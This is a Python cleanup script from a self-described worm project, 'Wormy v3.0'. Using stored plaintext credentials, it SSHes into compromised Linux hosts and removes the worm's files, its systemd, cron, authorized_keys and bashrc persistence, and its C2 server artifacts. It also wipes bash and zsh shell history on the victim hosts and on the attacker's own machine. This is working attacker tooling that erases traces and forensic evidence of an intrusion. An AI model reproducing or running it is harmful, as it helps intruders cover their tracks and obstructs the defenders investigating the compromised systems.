# -*- coding: utf-8 -*-
"""
Wormy v3.0 — Post-Engagement Cleanup Script
Developed by Ruby570bocadito

Removes ALL traces of the worm from remote hosts and the local machine:
  1. SSH into each compromised agent and remove worm files + persistence
  2. Remove local worm logs, temp files, SQLite queues
  3. Clear local shell history
  4. Restore config.yaml backup
  5. Generate a cleanup audit trail

Usage:
  python3 scripts/cleanup_engagement.py                  # full cleanup
  python3 scripts/cleanup_engagement.py --local-only     # only local cleanup
  python3 scripts/cleanup_engagement.py --dry-run        # show what would happen
"""

import argparse
import glob
import json
import os
import shutil
import subprocess
import sys
import threading
from datetime import datetime
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
# Remote Cleanup (per compromised host via SSH)
# ─────────────────────────────────────────────────────────────────────────────
class RemoteCleanup:
    """Remove worm artifacts from a compromised Linux host via SSH."""

    # All paths the worm may have written to
    LINUX_ARTIFACTS = [
        "/tmp/.sysd",
        "/tmp/.wormy*",
        "/tmp/.sysguard.py",
        "/tmp/wormy_*",
        "/tmp/.sys*",
        "/dev/shm/.wormy*",
    ]

    # All persistence mechanisms the worm installs
    LINUX_PERSISTENCE = [
        # Systemd service
        "~/.config/systemd/user/sys-helper.service",
        "~/.config/systemd/user/sysupdate.service",
        # SSH authorized_keys injected line (contains "wormy" comment)
        None,  # handled separately
    ]

    REMOTE_CLEANUP_CMD = r"""
set -x 2>/dev/null || true

# Remove worm files
rm -f /tmp/.sysd /tmp/.sysguard.py 2>/dev/null
rm -f /tmp/wormy_* /tmp/.wormy* /tmp/.sys* 2>/dev/null
rm -f /dev/shm/.wormy* 2>/dev/null

# Remove systemd persistence
systemctl --user stop sys-helper sysupdate 2>/dev/null || true
systemctl --user disable sys-helper sysupdate 2>/dev/null || true
rm -f ~/.config/systemd/user/sys-helper.service 2>/dev/null
rm -f ~/.config/systemd/user/sysupdate.service 2>/dev/null
systemctl --user daemon-reload 2>/dev/null || true

# Remove cron entries
(crontab -l 2>/dev/null | grep -v "\.sysd\|wormy\|sysguard" | crontab -) 2>/dev/null || true

# Remove SSH authorized_keys injected line
if [ -f ~/.ssh/authorized_keys ]; then
    sed -i '/wormy/d' ~/.ssh/authorized_keys 2>/dev/null || true
fi

# Clear bash history
history -c 2>/dev/null || true
> ~/.bash_history 2>/dev/null || true
> ~/.zsh_history 2>/dev/null || true

# Remove LD_PRELOAD persistence
sed -i '/wormy/d' ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null || true

echo "CLEANUP_DONE"
"""

    def __init__(self, dry_run: bool = False):
        self.dry_run = dry_run

    def clean_host(self, ip: str, username: str, password: str) -> Dict:
        """SSH into host and run cleanup commands."""
        result = {"ip": ip, "status": "unknown", "output": ""}
        if self.dry_run:
            result["status"] = "dry_run"
            result["output"] = "DRY RUN — no changes made"
            logger.info(f"[DRY RUN] Would clean {ip}")
            return result

        try:
            import paramiko

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)

            # Run cleanup script
            _, stdout, stderr = ssh.exec_command(self.REMOTE_CLEANUP_CMD, timeout=30)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            ssh.close()

            if "CLEANUP_DONE" in out:
                result["status"] = "cleaned"
                result["output"] = out
                logger.success(f"Remote cleanup complete: {ip}")
            else:
                result["status"] = "partial"
                result["output"] = out + err
                logger.warning(f"Partial cleanup on {ip}: {err[:100]}")

        except ImportError:
            result["status"] = "error"
            result["output"] = "paramiko not installed"
        except Exception as e:
            result["status"] = "error"
            result["output"] = str(e)
            logger.debug(f"Remote cleanup failed on {ip}: {e}")

        return result

    def clean_all_agents(self, agents: List[Dict]) -> List[Dict]:
        """Parallel cleanup of all compromised agents."""
        results = []
        lock = threading.Lock()

        def _clean(agent):
            r = self.clean_host(agent["ip"], agent["username"], agent.get("password", ""))
            with lock:
                results.append(r)

        threads = [threading.Thread(target=_clean, args=(a,)) for a in agents]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=45)

        return results


# ─────────────────────────────────────────────────────────────────────────────
# Local Cleanup
# ─────────────────────────────────────────────────────────────────────────────
class LocalCleanup:
    """Remove all local worm artifacts from the attacker machine."""

    def __init__(self, worm_dir: str, dry_run: bool = False):
        self.worm_dir = worm_dir
        self.dry_run = dry_run
        self.removed = []

    def _remove(self, path: str):
        if self.dry_run:
            if os.path.exists(path):
                logger.info(f"[DRY RUN] Would remove: {path}")
            return
        try:
            if os.path.isfile(path):
                os.remove(path)
                self.removed.append(path)
                logger.debug(f"Removed: {path}")
            elif os.path.isdir(path):
                shutil.rmtree(path)
                self.removed.append(path)
                logger.debug(f"Removed dir: {path}")
        except Exception as e:
            logger.debug(f"Could not remove {path}: {e}")

    def clean_logs(self) -> int:
        """Remove all log files."""
        patterns = [
            os.path.join(self.worm_dir, "logs", "*.log"),
            os.path.join(self.worm_dir, "logs", "**", "*.log"),
            os.path.join(self.worm_dir, "*.log"),
            "/tmp/wormy_*.log",
            "/tmp/wormy_run_*.log",
        ]
        before = len(self.removed)
        for pat in patterns:
            for f in glob.glob(pat, recursive=True):
                self._remove(f)
        return len(self.removed) - before

    def clean_temp_files(self) -> int:
        """Remove temp files and SQLite queues."""
        patterns = [
            os.path.join(self.worm_dir, "*.db"),
            os.path.join(self.worm_dir, "*.tmp"),
            os.path.join(self.worm_dir, "temp_new_brain.pth"),
            "/tmp/wormy_*",
            "/tmp/.sysguard.py",
            "/tmp/.wormy*",
            "/tmp/.sys*",
            "/tmp/wormy_c2_server",
            "/tmp/wormy_c2_listener.py",
            "/tmp/wormy_c2.crt",
            "/tmp/wormy_c2.key",
        ]
        before = len(self.removed)
        for pat in patterns:
            for f in glob.glob(pat):
                self._remove(f)
        return len(self.removed) - before

    def clean_pids(self) -> int:
        """Remove PID files."""
        pid_dir = "/tmp/wormy_pids"
        before = len(self.removed)
        if os.path.isdir(pid_dir):
            # Kill all tracked processes first
            for pid_file in glob.glob(os.path.join(pid_dir, "*.pid")):
                try:
                    with open(pid_file) as f:
                        pid = int(f.read().strip())
                    if not self.dry_run:
                        import signal

                        try:
                            os.kill(pid, signal.SIGTERM)
                            logger.info(f"Killed PID {pid} ({os.path.basename(pid_file)})")
                        except ProcessLookupError:
                            pass
                    else:
                        logger.info(f"[DRY RUN] Would kill PID {pid}")
                except Exception:
                    pass
            self._remove(pid_dir)
        return len(self.removed) - before

    def restore_config_backup(self):
        """Restore config.yaml from .bak if it exists."""
        backup = os.path.join(self.worm_dir, "configs", "config.yaml.bak")
        config = os.path.join(self.worm_dir, "configs", "config.yaml")
        if os.path.exists(backup):
            if not self.dry_run:
                shutil.copy2(backup, config)
                os.remove(backup)
                logger.success("config.yaml restored from backup")
            else:
                logger.info("[DRY RUN] Would restore config.yaml from backup")
        else:
            logger.debug("No config.yaml.bak found — skipping restore")

    def clear_local_history(self):
        """Clear shell history to remove worm commands."""
        if self.dry_run:
            logger.info("[DRY RUN] Would clear shell history")
            return
        for hist in ["~/.bash_history", "~/.zsh_history", "~/.sh_history"]:
            path = os.path.expanduser(hist)
            if os.path.exists(path):
                try:
                    open(path, "w").close()
                except Exception:
                    pass
        try:
            subprocess.run(["history", "-c"], capture_output=True)
        except Exception:
            pass
        logger.info("Local shell history cleared")

    def kill_switch(self):
        """Create kill switch file to stop any running worm processes."""
        ks = os.path.join(self.worm_dir, "STOP_WORMY_NOW")
        if not self.dry_run:
            open(ks, "w").close()
            logger.success(f"Kill switch created: {ks}")
        else:
            logger.info(f"[DRY RUN] Would create: {ks}")

    def run_all(self) -> Dict:
        """Run complete local cleanup."""
        self.kill_switch()
        logs = self.clean_logs()
        temps = self.clean_temp_files()
        pids = self.clean_pids()
        self.restore_config_backup()
        self.clear_local_history()

        return {
            "logs_removed": logs,
            "temps_removed": temps,
            "pids_cleaned": pids,
            "total_removed": len(self.removed),
            "dry_run": self.dry_run,
        }


# ─────────────────────────────────────────────────────────────────────────────
# Load agents from AgentController state
# ─────────────────────────────────────────────────────────────────────────────
def load_agents_from_state(state_file: Optional[str] = None) -> List[Dict]:
    """Load compromised agent list from JSON state file."""
    if state_file and os.path.exists(state_file):
        try:
            with open(state_file) as f:
                data = json.load(f)
            agents = []
            for agent_id, info in data.items():
                if info.get("ip") and info.get("username"):
                    agents.append(
                        {
                            "ip": info["ip"],
                            "username": info["username"],
                            "password": info.get("password", ""),
                        }
                    )
            return agents
        except Exception as e:
            logger.warning(f"Could not load agents from {state_file}: {e}")
    return []


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Wormy Post-Engagement Cleanup")
    parser.add_argument(
        "--dry-run", action="store_true", help="Show what would happen, make no changes"
    )
    parser.add_argument(
        "--local-only", action="store_true", help="Only clean local machine, skip remote agents"
    )
    parser.add_argument(
        "--agents-file", default=None, help="JSON file with agent list (ip/username/password)"
    )
    parser.add_argument("--worm-dir", default=None, help="Path to worm directory")
    args = parser.parse_args()

    worm_dir = args.worm_dir or os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    mode = "DRY RUN" if args.dry_run else "LIVE"
    ts = datetime.utcnow().isoformat()

    print(f"\n{'='*60}")
    print(f"  WORMY v3.0 — POST-ENGAGEMENT CLEANUP")
    print(f"  Mode:    {mode}")
    print(f"  Time:    {ts}")
    print(f"{'='*60}\n")

    if not args.dry_run:
        confirm = input("  This will REMOVE all worm artifacts. Type 'CLEANUP' to confirm: ")
        if confirm != "CLEANUP":
            print("  Aborted.")
            sys.exit(0)

    audit = {"timestamp": ts, "mode": mode, "local": {}, "remote": []}

    # ── Local cleanup ────────────────────────────────────────────────────────
    print("\n[1/2] Local machine cleanup...")
    local = LocalCleanup(worm_dir, dry_run=args.dry_run)
    local_result = local.run_all()
    audit["local"] = local_result
    print(f"  Removed {local_result['total_removed']} files/dirs")
    print(
        f"  Logs: {local_result['logs_removed']}  Temps: {local_result['temps_removed']}  PIDs: {local_result['pids_cleaned']}"
    )

    # ── Remote cleanup ───────────────────────────────────────────────────────
    if not args.local_only:
        print("\n[2/2] Remote agent cleanup...")

        # Load agents from state file or controller
        agents = load_agents_from_state(args.agents_file)

        if not agents:
            # Try to load from AgentController memory
            try:
                from core.agent_controller import AgentController

                ctrl = AgentController.__new__(AgentController)
                # AgentController singleton would have agents in memory
                # but since we are a new process, load from disk if saved
                state_path = os.path.join(worm_dir, "data", "agents.json")
                agents = load_agents_from_state(state_path)
            except Exception:
                pass

        if agents:
            remote = RemoteCleanup(dry_run=args.dry_run)
            results = remote.clean_all_agents(agents)
            audit["remote"] = results
            cleaned = sum(1 for r in results if r["status"] == "cleaned")
            print(f"  Remote hosts cleaned: {cleaned}/{len(results)}")
            for r in results:
                icon = "OK" if r["status"] == "cleaned" else "WARN"
                print(f"    [{icon}] {r['ip']}: {r['status']}")
        else:
            print("  No remote agents found — provide --agents-file path/to/agents.json")
            print('  Format: {"id": {"ip": "x.x.x.x", "username": "u", "password": "p"}}')

    # ── Audit trail ──────────────────────────────────────────────────────────
    audit_path = os.path.join(
        worm_dir, f"cleanup_audit_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
    )
    if not args.dry_run:
        try:
            with open(audit_path, "w") as f:
                json.dump(audit, f, indent=2, default=str)
            print(f"\n  Audit log: {audit_path}")
        except Exception:
            pass

    print(f"\n{'='*60}")
    print(f"  CLEANUP {'COMPLETE' if not args.dry_run else 'DRY RUN COMPLETE'}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
